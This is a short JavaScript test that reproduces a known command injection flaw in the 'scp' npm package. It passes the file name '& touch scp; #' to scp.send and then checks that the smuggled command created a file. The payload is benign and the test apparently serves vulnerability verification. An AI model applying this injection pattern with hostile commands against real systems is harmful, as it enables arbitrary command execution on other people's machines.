//https://snyk.io/vuln/SNYK-JS-SCP-1009828
test("Command Injection in scp", () => {
  const scp = require("scp");
  const fs = require("fs");
  const path = "./scp";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  let options = {
    file: "& touch scp; #",
    user: "username",
    host: "myServer",
    port: "20",
    path: "~",
  };

  scp.send(options, function (err) {});

  sleep.sleep(5);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
